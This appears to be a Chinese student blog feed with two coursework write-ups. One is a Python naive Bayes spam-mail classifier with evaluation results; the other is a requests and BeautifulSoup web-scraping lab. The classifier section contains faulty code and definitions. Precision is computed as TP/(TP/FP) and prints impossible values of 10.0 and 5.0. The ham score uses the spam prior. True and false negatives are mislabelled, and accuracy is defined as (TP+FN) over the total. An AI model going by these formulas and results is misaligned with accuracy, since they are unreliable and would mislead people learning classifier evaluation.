p0,p1,pSpam</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>计算spam、ham各占总邮件数的概率p_spam、p_ham</li>
<li>计算待测试集的特征集向量test_vec</li>
<li>将<code>test_vec*spam_vec*p_spam</code> 与<code>test_vec*ham_vec*p_ham</code>相比</li>
<li>哪方概率大则该封测试邮件属于哪一类（为了避免正常邮件分为垃圾邮件，当概率相等时，判定为正常）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_classify</span><span class="params">(test,features,ham_vec,spam_vec,p_spam)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(test, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        test_lines = f1.readlines()</span><br><span class="line">    line_i=<span class="number">1</span> <span class="comment">#用于判断计算到了第几封test，test集中，前50为正常，后50为垃圾</span></span><br><span class="line">    TP=<span class="number">0</span> <span class="comment">#正确肯定</span></span><br><span class="line">    TN=<span class="number">0</span> <span class="comment">#正确否定</span></span><br><span class="line">    FP=<span class="number">0</span> <span class="comment">#错误肯定</span></span><br><span class="line">    FN=<span class="number">0</span> <span class="comment">#错误否定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test_lines: <span class="comment">#计算test集邮件的词向量，并且判断正常\垃圾</span></span><br><span class="line">        test_vec = np.zeros(len(features))</span><br><span class="line">        line = i.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)):</span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line :</span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature:</span><br><span class="line">                    test_vec[j]=test_vec[j]+<span class="number">1</span></span><br><span class="line">        pnorm=sum(test_vec*ham_vec*p_spam)</span><br><span class="line">        pabu=sum(test_vec*spam_vec*p_spam)</span><br><span class="line">        <span class="comment"># if (line_i == 47):</span></span><br><span class="line">        <span class="comment">#     print(test_vec)</span></span><br><span class="line">        <span class="comment"># if(line_i==51): #如果开始判断垃圾邮件就分下行</span></span><br><span class="line">            <span class="comment"># print("————————————————————————————————————————")</span></span><br><span class="line">        <span class="keyword">if</span> pnorm&gt;=pabu : <span class="comment">#正常概率大（ps:当概率相等时，判定为正常)</span></span><br><span class="line">            <span class="keyword">if</span> line_i&gt;<span class="number">50</span> :</span><br><span class="line">                <span class="comment"># print("第%d封邮件是正常邮件" % line_i, end='')</span></span><br><span class="line">                <span class="comment"># print("————判断错误！————"+"其实是垃圾邮件哒!",end='')</span></span><br><span class="line">                FP=FP+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print("第%d封邮件是正常邮件" % line_i, end='')</span></span><br><span class="line">                TP =TP+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> line_i &lt; <span class="number">51</span>:</span><br><span class="line">                <span class="comment"># print("————判断错误！————" + "其实是正常邮件哒",end='')</span></span><br><span class="line">                TN=TN+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print("第%d封邮件是错误邮件" % line_i, end='')</span></span><br><span class="line">                FN=FN+<span class="number">1</span></span><br><span class="line">        <span class="comment"># print("   正常概率VS错误概率：",end='')</span></span><br><span class="line">        <span class="comment"># print(pnorm,pabu)</span></span><br><span class="line">        line_i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"featuears项数："</span>,len(features))</span><br><span class="line">    print(<span class="string">"正确肯定：预测为真，实际为真"</span>,TP)</span><br><span class="line">    print(<span class="string">"正确否定：预测为假，实际为真"</span>,TN)</span><br><span class="line">    print(<span class="string">"错误肯定：预测为真，实际为假"</span>,FP)</span><br><span class="line">    print(<span class="string">"错误否定：预测为假，实际为假"</span>,FN)</span><br><span class="line">    P=TP/(TP/FP) <span class="comment">#查准率</span></span><br><span class="line">    R=TP/(TP+FN) <span class="comment">#查全率</span></span><br><span class="line">    ACC=(TP+FN)/(TP+TN+FP+FN)</span><br><span class="line">    F = <span class="number">2</span>*TP / (<span class="number">2</span>*TP+FP+FN)</span><br><span class="line">    print(<span class="string">"查准率P=TP/（TP+FP）:"</span>,P)</span><br><span class="line">    print(<span class="string">"查全率R=TP/（TP+FN）:"</span>,R)</span><br><span class="line">    print(<span class="string">"准确率ACC=(TP+FN) / (TP+TN+FP+FN):"</span>,ACC)</span><br><span class="line">    print(<span class="string">"调和均值F= 2TP / (2TP+FP+FN):"</span>,F)</span><br></pre></td></tr></table></figure>

<p>main函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    number_of_item=[<span class="number">10</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>,<span class="number">150</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">500</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> number_of_item:</span><br><span class="line">        print(<span class="string">"————————————————————————————————————————"</span>)</span><br><span class="line">        print(<span class="string">"特征项数为："</span>,i)</span><br><span class="line">        extract_tags_f(<span class="string">"test.utf8"</span>, <span class="string">"test_word.txt"</span>,i)  </span><br><span class="line">        <span class="comment">#对测试集分词</span></span><br><span class="line">        features = extract_tags_f(<span class="string">"ham_100.utf8"</span>, <span class="string">"ham_word.txt"</span>,i) </span><br><span class="line">        <span class="comment">#对正常邮件分词，并提取词向量</span></span><br><span class="line">        features += extract_tags_f(<span class="string">"spam_100.utf8"</span>, <span class="string">"spam_word.txt"</span>,i) </span><br><span class="line">        <span class="comment">#垃圾邮件分词，并提取词向量</span></span><br><span class="line">        duplicated = set()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(features)):</span><br><span class="line">            <span class="keyword">if</span> features[i] <span class="keyword">in</span> features[i+<span class="number">1</span>:]:</span><br><span class="line">                duplicated.add(features[i]) </span><br><span class="line">                <span class="comment">#寻找垃圾邮件和正常邮件重复的特征词</span></span><br><span class="line">        <span class="comment"># print(duplicated)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(features) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> features[i] <span class="keyword">in</span> duplicated:</span><br><span class="line">                features.remove(features[i]) </span><br><span class="line">                <span class="comment">#去除垃圾邮件和正常邮件重复的特征词，但是感觉效果并不好</span></span><br><span class="line">        <span class="comment"># print(features)</span></span><br><span class="line">        print(<span class="string">"去除重复词后特征项数为："</span>,len(features))</span><br><span class="line">        list_sum,cate=calc_vec(<span class="string">"ham_word.txt"</span>,<span class="string">"spam_word.txt"</span>,features) <span class="comment">#计算总体词向量</span></span><br><span class="line">        ham_vec, spam_vec,p_spam=traing_bayes(list_sum,cate) <span class="comment">#计算条件概率，以及先验概率</span></span><br><span class="line">        test_classify(<span class="string">"test_word.txt"</span>,features,ham_vec, spam_vec,p_spam) <span class="comment">#分类</span></span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416165856310.png" alt="image-20200416165856310"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>朴素贝叶斯分类算法评价：</p>
<p><strong>查准率（Precision）、查全率（召回率）（Recall）</strong>、<strong>准确率(Accuracy)</strong></p>
<p>我们将算法预测的结果分成四种情况：</p>
<ol>
<li><p><strong>正确肯定</strong>（True Positive,TP）：预测为真，实际为真</p>
</li>
<li><p><strong>正确否定</strong>（True Negative,TN）：预测为假，实际为真</p>
</li>
<li><p><strong>错误肯定</strong>（False Positive,FP）：预测为真，实际为假</p>
</li>
<li><p><strong>错误否定</strong>（False Negative,FN）：预测为假，实际为假</p>
</li>
</ol>
<p>则：</p>
<p><strong>查准率P=TP/（TP+FP）</strong></p>
<p><strong>查全率R=TP/（TP+FN）</strong></p>
<p><strong>准确率ACC=(TP+FN) / (TP+TN+FP+FN)</strong></p>
<p>以下为去除重读词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">去除重复词后特征项数为： 20</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.86</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.647887323943662</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 48</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.9</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6575342465753424</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 96</span><br><span class="line">查准率P&#x3D;TP&#x2F;（TP+FP）: 10.0</span><br><span class="line">查全率R&#x3D;TP&#x2F;（TP+FN）: 0.550561797752809</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.89</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6621621621621622</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 142</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 192</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 290</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 386</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 578</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.93</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">去除重复词后特征项数为： 924</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.92</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6666666666666666</span><br></pre></td></tr></table></figure>

<p>可以看到调和均值F趋近于极限了，再加特征项数也无用</p>
<p>如果不去除重读词，反而会好些，最好结果如下，特征项数为150</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416171617463.png" alt="image-20200416171617463"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特征项数为： 75</span><br><span class="line">去除重复词后特征项数为： 150</span><br><span class="line">featuears项数： 150</span><br><span class="line">正确肯定：预测为真，实际为真 49</span><br><span class="line">正确否定：预测为假，实际为真 1</span><br><span class="line">错误肯定：预测为真，实际为假 5</span><br><span class="line">错误否定：预测为假，实际为假 45</span><br><span class="line">查准率P&#x3D;TP&#x2F;（TP+FP）: 5.0</span><br><span class="line">查全率R&#x3D;TP&#x2F;（TP+FN）: 0.5212765957446809</span><br><span class="line">准确率ACC&#x3D;(TP+FN) &#x2F; (TP+TN+FP+FN): 0.94</span><br><span class="line">调和均值F&#x3D; 2TP &#x2F; (2TP+FP+FN): 0.6621621621621622</span><br></pre></td></tr></table></figure>

<p>错误的基本是如下6封，不过如果去除重复词那就不会有将正常邮件判断成错误邮件的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第29封邮件是错误邮件————判断错误！————其实是正常邮件哒   </span><br><span class="line">正常概率VS错误概率：-44.397541630442696 -44.09868095860785</span><br><span class="line">————————————————————————————————————————</span><br><span class="line">第64封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-13.513755442998768 -13.7612297041614</span><br><span class="line">第70封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-13.513755442998768 -13.7612297041614</span><br><span class="line">第73封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-6.9073094336244685 -6.939395461206766</span><br><span class="line">第92封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-54.79272850055003 -55.26584135501914</span><br><span class="line">第94封邮件是正常邮件————判断错误！————其实是垃圾邮件哒!   </span><br><span class="line">正常概率VS错误概率：-54.79272850055003 -55.26584135501914</span><br></pre></td></tr></table></figure>

<p>其中70\73都比较特殊，其邮件字数都很少，难以分类成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416172425856.png" alt="image-20200416172425856"></p>
<p>理论上来说，对于贝叶斯而言：</p>
<p><strong>主要优点</strong>有：</p>
<p>1）朴素贝叶斯模型发源于古典数学理论，有稳定的分类效率。 </p>
<p>2）对小规模的数据表现很好，能个处理多分类任务，适合增量式训练，尤其是数据量超出内存时，我们可以一批批的去增量训练。 </p>
<p>3）对缺失数据不太敏感，算法也比较简单，常用于文本分类。</p>
<p><strong>主要缺点</strong>有：</p>
<p>1） 理论上，朴素贝叶斯模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为朴素贝叶斯模型给定输出类别的情况下，假设属性之间相互独立，这个假设在实际应用中往往是不成立的，在属性个数比较多或者属性之间相关性较大时，分类效果不好。而在属性相关性较小时，朴素贝叶斯性能最为良好。对于这一点，有半朴素贝叶斯之类的算法通过考虑部分关联性适度改进。 </p>
<p>2）需要知道先验概率，且先验概率很多时候取决于假设，假设的模型可以有很多种，因此在某些时候会由于假设的先验模型的原因导致预测效果不佳。 </p>
<p>3）由于我们是通过先验和数据来决定后验的概率从而决定分类，所以分类决策存在一定的错误率。 </p>
<p>4）对输入数据的表达形式很敏感。</p>
<p>而综合实验：</p>
<p>对于邮件分类任务而言，贝叶斯确实蛮稳的，在如此少量的数据集中，有稳定的、有效的分类效率，对小规模的数据表现很好。</p>
<p>而其在这个数据集中的准确率ACC最高可达94%，基本无法再提高。</p>
<p>我个人认为原因主要有如下几点：</p>
<ul>
<li>训练集不够多，不够贴近实际</li>
<li>测试集存在特殊情况，如邮件极短、邮件较独特等</li>
<li>用于训练的特征项数，我上面的实验已经得出了结论</li>
</ul>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这次的实验还是收获很多的：</p>
<ul>
<li>学会了使用jieba库进行分词，提取特征词</li>
<li>学会了使用gensim进行word2vec词向量话</li>
<li>最大的收获是，自己实操，对贝叶斯算法进行了一次深入的尝试，很愉悦~</li>
<li>对文本分类的流程、机器学习的理解更深了</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03-25-information-security-exp-1</title>
    <url>/2020/03/25/2020-03-25-information-security-exp-1/</url>
    <content><![CDATA[<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403231659299.png" alt="image-20200403231659299"></p>
<a id="more"></a>

<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403140353613.png" alt="image-20200403140353613"></p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="实验1-1-requests库"><a href="#实验1-1-requests库" class="headerlink" title="实验1.1-requests库"></a>实验1.1-requests库</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200327164527042.png" alt="image-20200327164527042"></p>
<p>安装requests库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160841956.png" alt="image-20200402160841956"></p>
<h2 id="1-获取状态码"><a href="#1-获取状态码" class="headerlink" title="1.获取状态码"></a>1.获取状态码</h2><p>配置Python环境，使用通用代码框架爬取网站，并获取状态码。 爬取网址请自行选择。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()  <span class="comment"># 如果状态不是200，引发error异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding <span class="comment">#获取网页正确的编码格式</span></span><br><span class="line">        <span class="keyword">return</span> r.status_code  <span class="comment">#返回状态码</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url=<span class="string">"https://www.baidu.com/"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160846431.png" alt="image-20200402160846431"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160853276.png" alt="image-20200402160853276"></p>
<h2 id="2-使用post-方法"><a href="#2-使用post-方法" class="headerlink" title="2.使用post()方法"></a>2.使用post()方法</h2><p>使用requests库中的post()方法，向<a href="http://httpbin.org/post" target="_blank" rel="noopener">http://httpbin.org/post</a> 增加字段，其中your_name和ID，请使用自己的姓名及学号。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = &#123;<span class="string">'name'</span>: <span class="string">'LFL'</span>, <span class="string">'ID'</span>: <span class="string">'2017301500076'</span>&#125;</span><br><span class="line">r=requests.post(<span class="string">"http://httpbin.org/post"</span>, data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160901843.png" alt="image-20200402160901843"></p>
<h2 id="3-实例1-2-3-4"><a href="#3-实例1-2-3-4" class="headerlink" title="3.实例1/2/3/4"></a>3.实例1/2/3/4</h2><p>完成实例1/2/3/4，其中实例1中的浏览器版本、实例2中搜索关键、实例3中下载图片、实例4 中的IP地址请自行选择。</p>
<h3 id="1-亚马逊网站商品页面爬取"><a href="#1-亚马逊网站商品页面爬取" class="headerlink" title="1-亚马逊网站商品页面爬取"></a>1-亚马逊网站商品页面爬取</h3><p>直接访问亚马逊会返回503访问异常错误</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160906535.png" alt="image-20200402160906535"></p>
<p>所以在头部加上浏览器版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">hd=&#123;<span class="string">'user-agent'</span>:<span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line"><span class="comment"># r=requests.request('post','https://www.amazon.com/',headers=hd)</span></span><br><span class="line">r=requests.get(<span class="string">"https://www.amazon.com"</span>,headers=hd)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>

<p>返回码200正确</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160911519.png" alt="image-20200402160911519"></p>
<h3 id="2-搜索引擎搜索关键词提交"><a href="#2-搜索引擎搜索关键词提交" class="headerlink" title="2-搜索引擎搜索关键词提交"></a>2-搜索引擎搜索关键词提交</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_2</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = <span class="string">"WHU"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        kv = &#123;<span class="string">'wd'</span>: keyword,<span class="string">'user-agent'</span>:<span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line">        r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)</span><br><span class="line">        print(r.request.url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        print(r.text[<span class="number">1</span>:<span class="number">1000</span>])</span><br><span class="line">    <span class="comment"># 结果太长，打印前1000个字符</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160916924.png" alt="image-20200402160916924"></p>
<h3 id="3-网络图片的爬取和存储"><a href="#3-网络图片的爬取和存储" class="headerlink" title="3-网络图片的爬取和存储"></a>3-网络图片的爬取和存储</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> os  <span class="comment"># OS库提供了使用各种操作系统功能的接口。</span></span><br><span class="line">    url = <span class="string">"https://colalinn.github.io/2020/02/28/2020-02-28-algorithm-class/image-20200228174457509.png"</span></span><br><span class="line">    root = <span class="string">""</span></span><br><span class="line">    path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">            print(<span class="string">"就是py下的目录啦！"</span>)</span><br><span class="line">            <span class="comment"># os.mkdir(root)  # 用于以数字权限模式创建目录</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            print(<span class="string">"客官文件不存在哦,我们保存一下！"</span>)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">with</span> open(path, <span class="string">'wb'</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">                f.close()</span><br><span class="line">                print(<span class="string">"文件保存成功"</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 写代码时注意缩进</span></span><br><span class="line">            print(<span class="string">"文件已存在"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160921928.png" alt="image-20200402160921928"></p>
<h3 id="4-ip地址的查询"><a href="#4-ip地址的查询" class="headerlink" title="4-ip地址的查询"></a>4-ip地址的查询</h3><p>原ppt链接的网站会有一个弹窗，这里暂不改动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_4</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="comment"># url="http://www.ip138.com/ips138.asp?ip=" #这个链接不能用了</span></span><br><span class="line">    url = <span class="string">"https://ipchaxun.com/"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hd = &#123;<span class="string">'user-agent'</span>: <span class="string">'Chrome/66.0'</span>&#125;</span><br><span class="line">        r = requests.get(url + <span class="string">'220.181.38.148'</span>,headers=hd)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        print(r.text[<span class="number">1900</span>:<span class="number">2400</span>])  <span class="comment"># 输出最后2000个字符</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"爬取失败"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_4()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161147165.png" alt="image-20200402161147165"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161207830.png" alt="image-20200402161207830"></p>
<h1 id="实验1-2-BeautifulSoup库"><a href="#实验1-2-BeautifulSoup库" class="headerlink" title="实验1.2-BeautifulSoup库"></a>实验1.2-BeautifulSoup库</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>BeautifulSoup 是一个可以从HTML或XML文件中提取数据的Python库.它能够通过转换器实现文档导航、查找、修改。</p>
<p>安装        </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>

<p>解析器</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161235158.png" alt="image-20200402161235158"></p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul>
<li>参考实例2，爬取百度搜索风云榜 <a href="http://top.baidu.com/" target="_blank" rel="noopener">http://top.baidu.com/</a> 任一榜单，搜索结果按顺序逐行输出（含编号），榜单自选。</li>
<li>自行编码完成实例3，并回答思考题。</li>
<li>爬取当当图书排行榜（榜单自选），格式：爬取结果包含但不限于[排名 书名 作者]， 注意输出格式对齐。</li>
</ul>
<h2 id="1-爬取百度搜索风云榜"><a href="#1-爬取百度搜索风云榜" class="headerlink" title="1-爬取百度搜索风云榜"></a>1-爬取百度搜索风云榜</h2><p>使用审查可以看到百度搜索风云榜的标签都是a标签，属性是“list-title”</p>
<p>所以我们使用以下方式即可获取所有人物串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="string">'a'</span>, <span class="string">'list-title'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402161241441.png" alt="image-20200402161241441"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_2</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(<span class="string">"http://top.baidu.com/buzz?b=257&amp;fr=topboards"</span>)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line">    soup = BeautifulSoup(demo, <span class="string">'html.parser'</span>)</span><br><span class="line">    ulist = []</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>, <span class="string">'list-title'</span>):</span><br><span class="line">        ulist.append(tag.string)  <span class="comment"># Xlist.append()在列表X尾部增加一个新的元素</span></span><br><span class="line">        print(ulist.index(tag.string) + <span class="number">1</span>, ulist[ulist.index(tag.string)])</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># instance_1()</span></span><br><span class="line">    instance_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402160825591.png" alt="image-20200402160825591"></p>
<h2 id="2-爬取中国大学排行榜-扩展"><a href="#2-爬取中国大学排行榜-扩展" class="headerlink" title="2-爬取中国大学排行榜+扩展"></a>2-爬取中国大学排行榜+扩展</h2><p>一开始我们的代码如下，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            ulist.append([tr.td.string, tds[<span class="number">1</span>].string, tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>]))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    